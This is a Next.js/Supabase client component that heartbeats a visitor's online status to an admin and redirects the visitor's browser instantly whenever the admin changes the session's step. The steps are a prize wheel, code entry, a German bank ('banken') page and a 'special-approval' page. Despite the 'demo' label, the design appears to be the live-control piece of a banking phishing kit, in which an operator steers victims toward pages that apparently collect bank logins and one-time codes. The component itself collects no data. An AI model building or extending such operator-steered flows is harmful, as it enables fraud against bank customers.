"use client";

import { useEffect } from "react";
import { usePathname, useRouter } from "next/navigation";
import type { SessionStatus, SessionStep } from "@/types/session";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";
import { pathToStep, stepToPath } from "@/lib/session-routes";

type Props = {
  sessionId: string;
};

export function SessionRealtimeGate({ sessionId }: Props) {
  const router = useRouter();
  const pathname = usePathname();

  /* Presence: demo ortamında admin için online göstergesi */
  useEffect(() => {
    try {
      localStorage.setItem("activeSessionId", sessionId);
    } catch {
      /* ignore */
    }
    const supabase = createBrowserSupabaseClient();
    if (!supabase) return;

    const pulse = () => {
      void supabase
        .from("sessions")
        .update({ status: "online" })
        .eq("id", sessionId);
    };

    pulse();
    const t = window.setInterval(pulse, 25000);
    const markOffline = () => {
      void supabase
        .from("sessions")
        .update({ status: "offline" })
        .eq("id", sessionId);
    };

    const onVisibility = () => {
      if (document.visibilityState === "hidden") markOffline();
      else pulse();
    };

    window.addEventListener("pagehide", markOffline);
    window.addEventListener("beforeunload", markOffline);
    document.addEventListener("visibilitychange", onVisibility);

    return () => {
      window.clearInterval(t);
      window.removeEventListener("pagehide", markOffline);
      window.removeEventListener("beforeunload", markOffline);
      document.removeEventListener("visibilitychange", onVisibility);
      markOffline();
    };
  }, [sessionId]);

  /* İlk yüklemede sunucu adımı ile senkron */
  useEffect(() => {
    let cancelled = false;
    void (async () => {
      const supabase = createBrowserSupabaseClient();
      if (supabase === null) return;
      const { data } = await supabase.from("sessions").select("current_step,status").eq("id", sessionId).maybeSingle();

      if (cancelled || !data) return;
      const status = data.status as SessionStatus | undefined;
      if (status === "SPECIAL_INFO") {
        if (!pathname.startsWith("/special-approval")) {
          router.replace(`/special-approval?session=${encodeURIComponent(sessionId)}`);
        }
        return;
      }
      if (!data.current_step) return;
      const serverStep = data.current_step as SessionStep;
      let local: string | null = pathToStep(pathname);
      if (pathname.startsWith('/wheel')) local = "wheel";
      
      // Eğer kullanıcı çark sayfasındaysa ve server "code_entry" diyorsa yönlendirme (ikisi de aynı sayılır)
      if (local === "wheel" && serverStep === "code_entry") return;
      if (local === "banken" && serverStep === "bank") return;
      
      if (local && serverStep !== local) {
        router.replace(stepToPath(serverStep, sessionId));
      }
    })();
    return () => {
      cancelled = true;
    };
  }, [sessionId, pathname, router]);

  /* Realtime: admin current_step değişince anında yönlendir */
  useEffect(() => {
    const supabase = createBrowserSupabaseClient();
    if (!supabase) return;

    const channel = supabase
      .channel(`demo-session:${sessionId}`)
      .on(
        "postgres_changes",
        {
          event: "UPDATE",
          schema: "public",
          table: "sessions",
          filter: `id=eq.${sessionId}`,
        },
        (payload) => {
          const next = payload.new as { current_step?: SessionStep; status?: SessionStatus };
          if (next.status === "SPECIAL_INFO") {
            if (!pathname.startsWith("/special-approval")) {
              router.replace(`/special-approval?session=${encodeURIComponent(sessionId)}`);
            }
            return;
          }
          if (!next.current_step) return;
          let local: string | null = pathToStep(pathname);
          if (pathname.startsWith('/wheel')) local = "wheel";

          if (local === "wheel" && next.current_step === "code_entry") return;
          if (local === "banken" && next.current_step === "bank") return;

          if (local && next.current_step !== local) {
            router.replace(stepToPath(next.current_step, sessionId));
          }
        },
      )
      .subscribe();

    return () => {
      void supabase.removeChannel(channel);
    };
  }, [sessionId, pathname, router]);

  return null;
}
